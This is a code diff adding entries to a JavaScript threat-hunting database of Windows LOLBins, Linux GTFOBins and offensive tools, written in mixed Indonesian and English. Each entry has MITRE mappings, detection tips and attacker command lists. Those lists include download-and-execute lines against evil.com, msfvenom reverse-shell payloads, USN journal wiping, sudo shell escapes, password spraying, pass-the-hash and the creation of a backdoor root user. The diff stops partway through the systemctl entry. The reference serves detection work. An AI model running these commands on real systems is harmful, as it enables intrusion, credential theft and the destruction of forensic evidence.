@@ -1815,43 +1815,472 @@ const DB = [
   // ┌──────────────────────────────────────────────┐
   // │        WINDOWS — CREDENTIAL / RECON           │
   // └──────────────────────────────────────────────┘
-  { n:"whoami.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\whoami.exe",
-    d:"Current user identity info", r:"LOW",
-    m:["T1033"], mn:["System Owner/User Discovery"], t:["Discovery"],
-    tldr:"Cek identity current user — standalone sangat benign. Tapi 'whoami /all' adalah cara attacker verify privilege setelah exploit: dapat token info, group membership, privilege list. Kalau muncul post-exploit atau dari unexpected parent, ini discovery phase.",
-    abuse:"Post-exploitation privilege verification, enumerate user tokens and groups.",
+  // ┌──────────────────────────────────────────────┐
+  // │        WINDOWS — SYSTEM / RECON (EXTRA)       │
+  // └──────────────────────────────────────────────┘
+  { n:"runas.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\runas.exe",
+    d:"Run program as different user", r:"HIGH",
+    m:["T1134.002","T1078"], mn:["Create Process with Token","Valid Accounts"], t:["Privilege Escalation","Lateral Movement"],
+    tldr:"Spawn process sebagai user lain — legitimate kalau admin butuh exec something sebagai service account. Yang bikin ini dangerous: /savecred flag menyimpan password di Credential Manager, sehingga attacker bisa pakai lagi tanpa tahu passwordnya. Cek kombinasi dengan cmdkey /add.",
+    abuse:"Lateral movement / privesc dengan stolen credentials, abuse /savecred untuk persistent access.",
     red:{
-      desc:"Verify current privilege level dan group membership post-exploit.",
+      desc:"Spawn process sebagai privileged user menggunakan stolen credentials atau /savecred abuse.",
       cmds:[
-        {c:"whoami /all", n:"dump semua info: username, SID, group memberships, privileges — privilege check post-exploit"},
-        {c:"whoami /priv", n:"list semua token privileges — cek SeDebugPrivilege, SeImpersonatePrivilege untuk priv esc"},
-        {c:"whoami /groups", n:"list group membership — verify domain admin?"},
-        {c:"whoami /fo list", n:"output dalam format list — scripting-friendly"},
+        {c:"runas /user:DOMAIN\\Administrator \"cmd.exe\"", n:"spawn CMD sebagai Domain Admin — perlu password, tapi visible di keyboard input"},
+        {c:"runas /savecred /user:DOMAIN\\Administrator \"cmd.exe\"", n:"/savecred = pakai saved credential atau prompt + simpan untuk next use"},
+        {c:"runas /user:DOMAIN\\admin \"powershell -ep bypass -w hidden -enc BASE64\"", n:"spawn hidden PS sebagai admin — post credential dump"},
+        {c:"cmdkey /add:TARGET /user:admin /pass:P@ss123 && runas /savecred /user:TARGET\\admin cmd.exe", n:"add credential dulu lalu pakai /savecred — chain setup lateral movement"},
       ]
     },
-    legit:"Verify identity, troubleshoot permission issues.",
-    tips:["Standalone very low risk","Cek konteks — muncul setelah exploit?","Cek parent process (cmd spawn dari malware?)","Cek /all atau /priv flags (deep privilege check)","Korelasi dengan discovery phase activity lain"],
-    detect:"Low standalone. Korelasikan dengan post-exploitation chain.",
-    ref:["https://attack.mitre.org/techniques/T1033/"] },
+    legit:"Admin task switching, service account testing.",
+    tips:["Cek /savecred flag — credential disimpan ke CredMan","Cek username target — admin? domain admin?","Cek parent process","Cek cmdkey usage sebelumnya (credential staging)","Cek apa yang di-exec sebagai user target"],
+    detect:"Alert runas /savecred. Monitor runas + admin account dari user biasa.",
+    ref:["https://attack.mitre.org/techniques/T1134/002/"] },
 
-  { n:"tasklist.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\tasklist.exe",
-    d:"List running processes", r:"LOW",
-    m:["T1057"], mn:["Process Discovery"], t:["Discovery"],
-    tldr:"List running processes — benign standalone, attacker pakai untuk recon: identify security tools (AV, EDR), find target process untuk injection, verify C2 beacon berjalan. Kalau muncul dari suspicious parent atau dengan filter spesifik, cek konteks.",
-    abuse:"Security tool discovery, process injection targeting, verify malware execution.",
+  { n:"attrib.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\attrib.exe",
+    d:"Change file attributes", r:"LOW",
+    m:["T1564.001","T1222.001"], mn:["Hide Artifacts: Hidden Files","File Permissions Modification"], t:["Defense Evasion"],
+    tldr:"Ubah file attributes — yang paling penting: +h (hidden) dan +s (system) kombinasi bikin file tidak keliatan di Explorer bahkan dengan 'Show hidden files'. Attacker sering pakai ini hide malware, backdoor scripts, atau staging directories. Standalone low risk tapi dalam konteks malicious = cover tracks.",
+    abuse:"Hide malicious files dan directories dari view. Cover tracks post-compromise.",
     red:{
-      desc:"Enumerate running processes untuk target selection dan security tool discovery.",
+      desc:"Hide payloads dan persistence files dari standard directory listing.",
       cmds:[
-        {c:"tasklist /fo csv /nh", n:"list processes dalam CSV format — easy parsing untuk script"},
-        {c:"tasklist /svc", n:"list processes beserta services — identify security services"},
-        {c:"tasklist | findstr -i /c:defender /c:crowdstrike /c:cylance /c:sentinel", n:"cek apakah EDR/AV aktif — pre-attack recon"},
-        {c:"tasklist /fi \"USERNAME eq SYSTEM\"", n:"filter proses yang run sebagai SYSTEM — target untuk token impersonation"},
+        {c:"attrib +h +s C:\\Temp\\evil.exe", n:"+h=hidden, +s=system — tidak muncul di Explorer bahkan dengan 'show hidden'"},
+        {c:"attrib +h +s C:\\ProgramData\\MalwareDir\\", n:"hide entire staging directory"},
+        {c:"attrib +h C:\\Users\\Public\\backdoor.bat", n:"hide backdoor script dari casual browsing"},
+        {c:"attrib -h -s C:\\Temp\\evil.exe", n:"unhide untuk use lagi — remove hidden attribute"},
       ]
     },
-    legit:"Process troubleshooting, system monitoring.",
-    tips:["Cek filter patterns — cari AV/EDR names?","Cek /fo csv (scripted parsing)","Cek parent process","Standalone low risk, high in context"],
-    detect:"Alert tasklist dengan AV/EDR name filter. Korelasikan dengan post-exploitation activity.",
-    ref:["https://attack.mitre.org/techniques/T1057/"] },
+    legit:"System file management, OS-level file protection.",
+    tips:["Cek +h +s kombinsai pada non-system files","Cek target path — Temp, AppData, Public?","Cek parent process (cmd dari malware?)","Dir /a:h untuk lihat hidden files","Cek apa file yang di-hide"],
+    detect:"Monitor attrib +h +s pada user-writable paths. Alert hidden files di suspicious locations.",
+    ref:["https://attack.mitre.org/techniques/T1564/001/"] },
+
+  { n:"fsutil.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\fsutil.exe",
+    d:"File system utility", r:"MEDIUM",
+    m:["T1564.004","T1070.004"], mn:["Hide Artifacts: NTFS File Attributes","File Deletion"], t:["Defense Evasion"],
+    tldr:"File system utility yang multi-fungsi. Dua hal yang langsung suspicious: 'file createNew' untuk create file tanpa content (staging atau ADS placeholder), dan 'usn deletejournal' yang hapus USN journal — itu source forensic artifacts yang penting buat trace file activity. Kalau journal dihapus, timeline forensic lo berlubang.",
+    abuse:"Create files for ADS, delete USN journal (forensic evasion), query file info.",
+    red:{
+      desc:"Delete USN change journal untuk hilangkan file activity history, manipulate file system.",
+      cmds:[
+        {c:"fsutil usn deletejournal /d C:", n:"hapus USN Change Journal dari C: — hilangkan record semua file create/modify/delete"},
+        {c:"fsutil file createNew C:\\Temp\\legit.txt 0", n:"create zero-byte file — placeholder atau ADS host"},
+        {c:"fsutil file setZeroData offset=0 length=1000000 C:\\Temp\\evidence.log", n:"zero out file content tanpa hapus — destroy evidence tanpa triggering delete alert"},
+        {c:"fsutil sparse setFlag C:\\Temp\\hidden.dat", n:"mark file sebagai sparse — sebagian content jadi zero, harder to parse"},
+      ]
+    },
+    legit:"File system troubleshooting, disk quota management, storage testing.",
+    tips:["Cek usn deletejournal — forensic artifact destruction","Cek file createNew dari suspicious context","Cek setZeroData — content wiping","Cek parent process","Cek apakah berjalan post-compromise"],
+    detect:"Alert fsutil usn deletejournal. Alert fsutil setZeroData pada log/evidence files.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Fsutil/","https://attack.mitre.org/techniques/T1070/004/"] },
+
+  { n:"wsl.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wsl.exe",
+    d:"Windows Subsystem for Linux launcher", r:"HIGH",
+    m:["T1202","T1059.004"], mn:["Indirect Command Execution","Unix Shell"], t:["Defense Evasion","Execution"],
+    tldr:"WSL launcher — kalau WSL aktif di endpoint, ini bisa dipakai untuk bypass banyak Windows security controls karena Linux commands berjalan dalam konteks berbeda. Yang paling berbahaya: wsl.exe bisa dipakai untuk akses Windows filesystem dari Linux perspective, download tools, dan bypass AppLocker/WDAC yang tidak cover Linux binaries.",
+    abuse:"Bypass AppLocker/WDAC, run Linux commands on Windows, access Windows FS via Linux path.",
+    red:{
+      desc:"Indirect execution via Linux subsystem — bypass Windows application whitelisting dan beberapa EDR rules.",
+      cmds:[
+        {c:"wsl.exe curl http://evil.com/payload.sh | bash", n:"download + exec Linux payload via WSL — bypass Windows AV yang tidak scan Linux executables"},
+        {c:"wsl.exe -e /bin/bash -c \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\"", n:"spawn bash via WSL — indirect execution"},
+        {c:"wsl.exe cat /mnt/c/Users/user/ntds.dit", n:"akses Windows filesystem dari WSL context (/mnt/c = C:\\)"},
+        {c:"wsl.exe --import UbuntuBackdoor C:\\Temp\\backdoor.tar.gz", n:"import custom distro (yang sudah dikompromis) sebagai WSL instance"},
+        {c:"wsl.exe -- bash -c \"curl http://evil.com/elf | bash\"", n:"download + exec ELF binary via WSL — tidak perlu .exe"},
+      ]
+    },
+    legit:"Developer workflow, Linux tools on Windows.",
+    tips:["Cek apakah WSL should be enabled on this endpoint","Cek command setelah wsl.exe","Cek akses ke /mnt/c/* path (Windows filesystem)","Cek network connections dari WSL","Cek apakah EDR coverage include WSL processes","Cek --import flag (custom distro)"],
+    detect:"Alert wsl.exe + network commands atau filesystem access. Monitor WSL process tree.",
+    ref:["https://attack.mitre.org/techniques/T1202/"] },
+
+  { n:"qwinsta.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\qwinsta.exe",
+    d:"Query Remote Desktop sessions", r:"LOW",
+    m:["T1049","T1087.001"], mn:["System Network Connections Discovery","Account Discovery: Local Account"], t:["Discovery"],
+    tldr:"Enumerate active RDP sessions — attacker pakai ini untuk identify siapa yang sedang login, cari session tanpa password untuk session hijacking, atau identify target machine yang worth lateral moving ke. Kalau muncul post-compromise dengan /server flag, itu remote session discovery.",
+    abuse:"Enumerate active RDP sessions for session hijacking or lateral movement targeting.",
+    red:{
+      desc:"Discover active user sessions untuk target session hijacking atau identify active admins.",
+      cmds:[
+        {c:"qwinsta /server:192.168.1.10", n:"query active sessions di remote host — identify siapa sedang aktif"},
+        {c:"qwinsta", n:"query local sessions — lihat active RDP sessions"},
+        {c:"query session /server:192.168.1.10", n:"alias qwinsta — sama fungsinya"},
+        {c:"tscon 2 /dest:rdp-tcp#3", n:"hijack RDP session nomor 2 — butuh SYSTEM, session lama di-takeover tanpa re-auth"},
+      ]
+    },
+    legit:"Remote Desktop administration, session management.",
+    tips:["Cek /server flag (remote enum)","Cek kombinasi dengan tscon (session hijacking)","Cek user context — admin?","Cek SYSTEM-level execution + tscon = session hijack","Korelasi dengan RDP logs (Event 4778, 4779)"],
+    detect:"Alert qwinsta /server dalam non-admin context. Alert qwinsta + tscon chain (session hijack).",
+    ref:["https://attack.mitre.org/techniques/T1049/"] },
+
+  { n:"route.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\route.exe",
+    d:"Display and modify routing table", r:"LOW",
+    m:["T1016"], mn:["System Network Configuration Discovery"], t:["Discovery"],
+    tldr:"Tampilkan dan modifikasi routing table — by itself sangat common dan benign. Tapi dalam konteks post-compromise, 'route print' kasih attacker full network topology: subnets yang ada, gateways, dan potential pivot targets. 'route add' bisa dipakai redirect traffic untuk C2 atau pivot.",
+    abuse:"Network topology discovery, route manipulation untuk C2 traffic redirect.",
+    red:{
+      desc:"Map network topology dan manipulate routing untuk pivot atau C2 traffic steering.",
+      cmds:[
+        {c:"route print", n:"tampilkan full routing table — map semua network segments yang reachable"},
+        {c:"route print -4", n:"hanya IPv4 routes — cleaner output untuk recon"},
+        {c:"route add 10.10.0.0 MASK 255.255.0.0 192.168.1.1", n:"tambah static route — redirect traffic ke subnet internal via pivot host"},
+        {c:"route print | findstr 0.0.0.0", n:"cek default gateway — identify main network path"},
+      ]
+    },
+    legit:"Network troubleshooting, static route configuration.",
+    tips:["Cek 'route add' command — suspicious destination?","Cek parent process","Korelasi dengan recon chain (ipconfig, netstat, arp)","route print standalone low risk — cek konteks"],
+    detect:"Alert route add dari non-admin. Low priority standalone, high in recon chain.",
+    ref:["https://attack.mitre.org/techniques/T1016/"] },
+
+  { n:"finger.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\finger.exe",
+    d:"User information lookup (legacy protocol)", r:"MEDIUM",
+    m:["T1105"], mn:["Ingress Tool Transfer"], t:["Command and Control"],
+    tldr:"Legacy Finger protocol client yang hampir tidak pernah dipakai legitimate. Yang bikin menarik buat attacker: bisa dipakai untuk download content via finger protocol (response body) ke memori — very obscure download method yang sering miss di detection. Hampir any usage = suspicious.",
+    abuse:"Download payloads via finger protocol — obscure download method bypass some AV/proxy filters.",
+    red:{
+      desc:"Obscure payload delivery via legacy Finger protocol — very rarely monitored.",
+      cmds:[
+        {c:"finger user@evil.com", n:"query finger server — response body bisa berisi encoded payload"},
+        {c:"finger malware/cmd@evil.com", n:"variant query dengan path — C2 command delivery"},
+        {c:"for /f \"delims=\" %a in ('finger payload@evil.com') do @echo %a > C:\\Temp\\p.bat && C:\\Temp\\p.bat", n:"capture output + exec — download-and-exec via finger"},
+      ]
+    },
+    legit:"HAMPIR TIDAK ADA legitimate use di modern enterprise.",
+    tips:["Any execution = suspicious","Cek destination server","Cek output dari finger — encoded payload?","Cek network connections — port 79","Cek parent process"],
+    detect:"Alert ANY finger.exe execution. Block port 79 di firewall.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Finger/","https://attack.mitre.org/techniques/T1105/"] },
+
+  { n:"xwizard.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\xwizard.exe",
+    d:"Extensible Wizard Host Process", r:"HIGH",
+    m:["T1218"], mn:["Signed Binary Proxy Execution"], t:["Defense Evasion","Execution"],
+    tldr:"Signed Windows binary yang bisa load DLL dari current directory via DLL search order hijacking — attacker taruh malicious DLL dengan nama yang tepat di same folder, lalu exec xwizard, Windows load DLL tanpa trust check. Juga bisa exec COM objects secara langsung.",
+    abuse:"DLL search order hijacking, COM object execution, AppLocker bypass.",
+    red:{
+      desc:"DLL side-loading via trusted Windows binary — DLL di current directory di-load tanpa verify.",
+      cmds:[
+        {c:"xwizard.exe RunWizard {GUID}", n:"exec COM object via GUID — registered COM objects bisa arbitrary code"},
+        {c:"C:\\Temp\\xwizard.exe RunWizard {GUID}", n:"copy xwizard ke folder dengan evil DLL yang bernama sama dengan dependency-nya"},
+        {c:"cd C:\\Temp\\ && xwizard.exe RunWizard {11111111-1111-1111-1111-111111111111}", n:"run dari temp dir dengan malicious DLL pre-placed — DLL hijack"},
+      ]
+    },
+    legit:"Windows Extensible Wizard functionality — sangat jarang di enterprise.",
+    tips:["Cek working directory saat xwizard dijalankan","Cek DLL yang di-load oleh xwizard","Cek apakah ada DLL baru di folder sama sebelum exec","Any execution dari unusual path = investigate","Cek parent process"],
+    detect:"Alert xwizard.exe dari non-System32 working directory. Monitor DLL loads.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Xwizard/","https://attack.mitre.org/techniques/T1218/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │        OFFENSIVE TOOLS (EXTRA)                │
+  // └──────────────────────────────────────────────┘
+  { n:"responder", c:"offensive", os:"linux", p:"/usr/bin/responder (Kali) / Responder.py",
+    d:"LLMNR/NBT-NS/mDNS poisoner and credential capture", r:"CRITICAL",
+    m:["T1557.001","T1040"], mn:["LLMNR/NBT-NS Poisoning and SMB Relay","Network Sniffing"], t:["Credential Access"],
+    tldr:"Classic network attack yang masih sangat efektif — kalau ada host yang gagal resolve hostname via DNS, Windows akan fallback ke LLMNR/NBT-NS broadcast, dan Responder menjawab sebagai 'siapa saja'. Victim auto-kirim NTLMv2 hash. Hash ini bisa di-crack offline atau di-relay. ANY execution di network = assume credential exposure.",
+    chain:{ stage:"Initial Access / Credential Access", flows:["Responder running → victim types UNC path wrong → NTLMv2 hash captured → hashcat offline crack","Responder SMB relay → ntlmrelayx → LDAP/SMB session → code exec"] },
+    abuse:"Capture NTLMv2 hashes dari network, relay NTLM untuk lateral movement, steal credentials.",
+    red:{
+      desc:"Poison network name resolution untuk force credential authentication ke attacker-controlled server.",
+      cmds:[
+        {c:"python3 Responder.py -I eth0 -wdv", n:"-w=WPAD,-d=domain auth,-v=verbose — capture NTLMv2 hashes dari semua clients di network"},
+        {c:"python3 Responder.py -I eth0 -A", n:"-A = analyze mode (passive, no poison) — monitor tanpa actual attack"},
+        {c:"python3 Responder.py -I eth0 --lm", n:"downgrade ke LM hash — easier to crack (sangat weak)"},
+        {c:"hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt", n:"crack captured NTLMv2 hashes offline dengan hashcat"},
+      ]
+    },
+    legit:"NONE production. Only authorized assessment.",
+    tips:["Cek network untuk LLMNR/NBT-NS disable (defensif)","Monitor LLMNR query responses dari unexpected IPs","Cek captured hashes — NTLMv2 in Responder.db","Alert jika Responder binary ditemukan","Defensive: disable LLMNR/NBT-NS via GPO","Cek ntlmrelayx bersamaan = relay attack"],
+    detect:"Disable LLMNR/NBT-NS. Monitor unusual NTLM auth dari unexpected servers. Alert Responder binary presence.",
+    ref:["https://attack.mitre.org/techniques/T1557/001/"] },
+
+  { n:"crackmapexec", c:"offensive", os:"linux", p:"/usr/bin/crackmapexec | netexec",
+    d:"Network exploitation and lateral movement framework", r:"CRITICAL",
+    m:["T1021.002","T1110.003","T1087.002"], mn:["SMB/Admin Shares","Password Spraying","Domain Account Discovery"], t:["Lateral Movement","Credential Access","Discovery"],
+    tldr:"Swiss army knife lateral movement — bisa spray password, exec command via SMB/WinRM/LDAP ke banyak hosts sekaligus, dump SAM/LSA, impersonate users. Sering dipakai dalam operasi setelah Responder capture hashes atau post-initial-access recon. Binary bisa renamed ke nama apapun tapi behavior-nya distinct.",
+    chain:{ stage:"Lateral Movement", flows:["credential capture → crackmapexec smb --pass-pol → spray → exec code → cme smb -M mimikatz","sharphound enum → crackmapexec smb -u admin -H hash --exec-method wmiexec → shell"] },
+    abuse:"Password spraying, pass-the-hash, lateral movement, credential dump, AD enum.",
+    red:{
+      desc:"Mass lateral movement dan credential testing framework — bisa target seluruh subnet sekaligus.",
+      cmds:[
+        {c:"crackmapexec smb 192.168.1.0/24 -u admin -p Pass123", n:"spray password ke seluruh subnet via SMB — identify valid hosts"},
+        {c:"crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH --local-auth", n:"pass-the-hash ke seluruh subnet — tanpa plaintext password"},
+        {c:"crackmapexec smb 192.168.1.10 -u admin -p Pass123 -x \"whoami\"", n:"exec command via SMB — command execution post-auth"},
+        {c:"crackmapexec smb 192.168.1.10 -u admin -p Pass123 --sam", n:"dump SAM database dari target host"},
+        {c:"crackmapexec ldap 192.168.1.5 -u admin -p Pass123 --bloodhound -ns 192.168.1.5 -c All", n:"BloodHound data collection via LDAP — AD attack path discovery"},
+        {c:"netexec smb 192.168.1.0/24 -u '' -p '' --shares", n:"null session SMB enum — list shares tanpa creds (versi baru: netexec)"},
+      ]
+    },
+    legit:"NONE production. Only authorized pentest.",
+    tips:["Detect by binary name/hash (cme, crackmapexec, netexec)","Cek mass SMB auth failures (spray pattern)","Cek SMB connections dari single source ke banyak hosts","Cek Event ID 4625 (failed logon) spike","Cek apakah hash vs password auth","ALWAYS INCIDENT jika ditemukan"],
+    detect:"Alert spray pattern (Event 4625 spike). Alert mass SMB connections dari single source. Detect binary hash.",
+    ref:["https://attack.mitre.org/techniques/T1021/002/"] },
+
+  { n:"kerbrute", c:"offensive", os:"cross", p:"/usr/local/bin/kerbrute (linux) / kerbrute.exe (win)",
+    d:"Kerberos user enumeration and brute force", r:"CRITICAL",
+    m:["T1110.001","T1087.002"], mn:["Brute Force: Password Guessing","Account Discovery: Domain Account"], t:["Credential Access","Discovery"],
+    tldr:"Kerberos-based user enum dan bruteforce — yang unique dari tools ini: user enumeration bisa dilakukan WITHOUT authentication (hanya butuh network access ke DC port 88). Pre-auth failure response berbeda dari 'user not found', jadi bisa enumerate valid usernames diam-diam. Detect dari AS-REQ spike di DC.",
+    abuse:"Enumerate valid domain usernames via Kerberos, brute-force domain accounts, password spray.",
+    red:{
+      desc:"User enumeration dan credential brute force via Kerberos pre-authentication.",
+      cmds:[
+        {c:"kerbrute userenum --dc 192.168.1.5 -d corp.local users.txt", n:"enumerate valid usernames via Kerberos — tidak butuh auth, hanya DC network access"},
+        {c:"kerbrute passwordspray --dc 192.168.1.5 -d corp.local users.txt 'Summer2024!'", n:"password spray — test satu password ke semua valid users"},
+        {c:"kerbrute bruteuser --dc 192.168.1.5 -d corp.local -u administrator passwords.txt", n:"bruteforce specific user — noisy tapi targeted"},
+        {c:"kerbrute userenum --dc 192.168.1.5 -d corp.local users.txt -t 10 --downgrade", n:"--downgrade = force RC4 untuk capture hashes — Kerberoast prep"},
+      ]
+    },
+    legit:"NONE production. Only authorized assessment.",
+    tips:["Cek spike AS-REQ ke DC (Event ID 4768 failures)","Cek AS-REQ dari single source IP ke banyak usernames","Cek binary keberadaan di network","User-not-found vs pre-auth-failed pattern berbeda","Alert mass 4768 KDC_ERR_C_PRINCIPAL_UNKNOWN","ALWAYS INCIDENT jika ditemukan"],
+    detect:"Alert AS-REQ spike dari single IP. Monitor Event 4768 mass failures. Detect binary.",
+    ref:["https://attack.mitre.org/techniques/T1110/001/"] },
+
+  { n:"hashcat", c:"offensive", os:"cross", p:"/usr/bin/hashcat | hashcat.exe",
+    d:"Password cracking tool", r:"HIGH",
+    m:["T1110.002","T1003"], mn:["Brute Force: Password Cracking","OS Credential Dumping"], t:["Credential Access"],
+    tldr:"GPU-accelerated password cracking — dipakai SETELAH hash capture atau dump. Sendiri gak otomatis berbahaya (banyak security researchers punya), tapi keberadaan hashcat + file hash (ntds.dit, lsass.dmp, .hccapx) = active cracking operation. Yang suspicious: banyak GPU usage + hash files di direktori sama.",
+    abuse:"Offline crack NTLM, NTLMv2, Kerberos TGS/TGT hashes dari dump atau capture.",
+    red:{
+      desc:"Offline password recovery dari captured/dumped hashes — post-credential-theft step.",
+      cmds:[
+        {c:"hashcat -m 1000 ntlm_hashes.txt rockyou.txt", n:"-m 1000 = NTLM hash mode — crack hashes dari SAM/NTDS dump"},
+        {c:"hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt", n:"-m 5600 = NTLMv2 — crack dari Responder/network capture"},
+        {c:"hashcat -m 13100 kerberoast_hashes.txt rockyou.txt", n:"-m 13100 = Kerberos TGS (kerberoast) — crack dari Rubeus/Impacket"},
+        {c:"hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule", n:"dengan rules — jauh lebih efektif dari straight wordlist"},
+        {c:"hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?d?d?d", n:"-a 3 = mask attack — brute dengan pattern tertentu"},
+      ]
+    },
+    legit:"Security research, authorized pentest, password auditing.",
+    tips:["Cek file hash yang dipakai sebagai input","Cek hash file source — dari mana didapat?","Cek GPU activity spike + hashcat process","Cek direktori — ada lsass.dmp, ntds.dit, .txt berisi hashes?","Standalone tidak cukup bukti — butuh hash file sebagai corroboration"],
+    detect:"Alert hashcat binary. Korelasikan dengan credential dump artifacts. Alert hash files (*.hccapx, lsass.dmp).",
+    ref:["https://attack.mitre.org/techniques/T1110/002/"] },
+
+  { n:"msfvenom", c:"offensive", os:"cross", p:"/usr/bin/msfvenom",
+    d:"Metasploit payload generator", r:"CRITICAL",
+    m:["T1587.001","T1059"], mn:["Develop Capabilities: Malware","Command and Scripting Interpreter"], t:["Execution"],
+    tldr:"Payload generator dari Metasploit framework — generate shellcode, executable, DLL, script payload dalam berbagai format. Keberadaan msfvenom di endpoint = attacker sedang generate atau sudah generate payload. Output file-nya adalah malware yang ready-to-deploy. Cek output file dan apakah sudah ada di sistem lain.",
+    chain:{ stage:"Weaponization / Delivery", flows:["msfvenom -p windows/meterpreter → beacon.exe → phish delivery → meterpreter session","msfvenom -p linux/x64/shell_reverse_tcp → elf payload → wget to victim → exec"] },
+    abuse:"Generate custom malware payload dalam berbagai format dan platform.",
+    red:{
+      desc:"Buat custom payload yang bypass AV/EDR untuk delivery ke target.",
+      cmds:[
+        {c:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o beacon.exe", n:"Windows 64-bit Meterpreter reverse shell executable"},
+        {c:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll -o evil.dll", n:"DLL payload — untuk DLL injection atau side-loading"},
+        {c:"msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell", n:"Linux ELF reverse shell binary"},
+        {c:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f powershell -o payload.ps1", n:"PowerShell stager — HTTPS C2 (harder to inspect)"},
+        {c:"msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php", n:"PHP web shell dengan Meterpreter — untuk compromised web server"},
+      ]
+    },
+    legit:"NONE production. Only authorized pentest/research.",
+    tips:["Detect keberadaan msfvenom binary","Cek output files — .exe, .dll, .ps1, .elf yang baru dibuat","Cek network traffic ke port 4444 (default Metasploit)","Cek apakah ada handler (msfconsole) di jaringan","Scan files baru yang dibuat setelah msfvenom exec","ALWAYS INCIDENT jika ditemukan"],
+    detect:"Alert msfvenom binary. Scan output files. Alert generic Meterpreter patterns di AV.",
+    ref:["https://attack.mitre.org/techniques/T1587/001/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │        LINUX — EXTRA GTFOBins / PERSISTENCE   │
+  // └──────────────────────────────────────────────┘
+  { n:"find", c:"lolbin", os:"linux", p:"/usr/bin/find",
+    d:"Search for files in directory hierarchy", r:"MEDIUM",
+    m:["T1083","T1548.001"], mn:["File and Directory Discovery","SUID and SGID"], t:["Discovery","Privilege Escalation"],
+    tldr:"find dipakai untuk dua hal penting dalam attack: (1) discover SUID/SGID binaries yang bisa dipakai priv esc, (2) GTFOBins — kalau find punya SUID atau ada di sudoers, bisa instant root. Yang kedua sudah di exec melalui -exec /bin/bash. Monitoring berguna kalau muncul dengan pattern priv esc discovery.",
+    abuse:"Discover SUID binaries untuk priv esc, shell escape via -exec, sensitive file discovery.",
+    red:{
+      desc:"SUID discovery untuk privilege escalation targeting dan GTFOBins exec via -exec flag.",
+      cmds:[
+        {c:"find / -perm -4000 -type f 2>/dev/null", n:"cari semua SUID binaries di sistem — priv esc recon standar"},
+        {c:"find / -perm -u=s -type f 2>/dev/null", n:"variant SUID discovery — equivalent command"},
+        {c:"find / -perm -4000 -o -perm -2000 2>/dev/null", n:"cari SUID + SGID binaries sekaligus"},
+        {c:"find / -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null | head -20", n:"cari config + credential files"},
+        {c:"find . -exec /bin/bash \\; -quit", n:"GTFOBins shell escape via -exec"},
+        {c:"sudo find / -exec /bin/bash -i \\; -quit", n:"priv esc via sudo find + -exec"},
+        {c:"find / -writable -path /proc -prune -o -type d -print 2>/dev/null", n:"cari world-writable directories — potential malware drop locations"},
+      ]
+    },
+    legit:"File search, system administration.",
+    tips:["Cek find / -perm -4000 = SUID discovery recon","Cek -exec flag dengan bash/sh","Cek sudo find execution","Cek sensitive file search patterns (passwd, shadow, .env)","Standalone normal, suspicious dalam post-exploit context"],
+    detect:"Alert find -perm -4000 dari non-admin. Alert sudo find dengan -exec.",
+    ref:["https://gtfobins.github.io/gtfobins/find/","https://attack.mitre.org/techniques/T1548/001/"] },
+
+  { n:"vim", c:"lolbin", os:"linux", p:"/usr/bin/vim",
+    d:"Vi IMproved text editor", r:"MEDIUM",
+    m:["T1059.004","T1548.001"], mn:["Unix Shell","SUID and SGID"], t:["Execution","Privilege Escalation"],
+    tldr:"Text editor yang ada di hampir semua Linux — dan ini GTFOBins klasik. ':!bash' dari dalam vim = instant shell. Yang lebih berbahaya: kalau vim ada di sudoers, bisa buka /etc/passwd sebagai root terus tulis backdoor. Cek sudoers untuk vim/vi entries.",
+    abuse:"Shell escape via :!command, SUID-based root shell, edit sensitive files as root via sudo.",
+    red:{
+      desc:"Shell escape dari vim session, privilege escalation via sudo vim atau SUID vim.",
+      cmds:[
+        {c:"vim -c ':!bash'", n:"langsung spawn bash dari vim tanpa interactive mode"},
+        {c:"sudo vim -c ':!bash'", n:"priv esc via sudo vim — spawn root shell"},
+        {c:"sudo vim /etc/sudoers", n:"edit sudoers sebagai root untuk tambah persistent sudo access"},
+        {c:"sudo vim /etc/passwd", n:"edit passwd untuk tambah root backdoor user (UID 0)"},
+        {c:"vim -c ':py3 import os; os.system(\"/bin/bash\")'", n:"Python GTFOBins via vim python3 integration"},
+      ]
+    },
+    legit:"Text editing.",
+    tips:["Cek sudo vim — ada di sudoers?","Cek vim SUID bit: ls -la /usr/bin/vim","Cek apa file yang dibuka (sensitive?)","Cek process spawn dari vim session","sudoers entry untuk vim = priv esc vector"],
+    detect:"Alert sudo vim. Alert SUID vim execution. Monitor vim spawning child processes.",
+    ref:["https://gtfobins.github.io/gtfobins/vim/","https://attack.mitre.org/techniques/T1059/004/"] },
+
+  { n:"systemctl", c:"system", os:"linux", p:"/usr/bin/systemctl",
+    d:"systemd service management", r:"HIGH",
+    m:["T1543.002","T1053.006"], mn:["Systemd Service","Systemd Timers"], t:["Persistence","Privilege Escalation"],
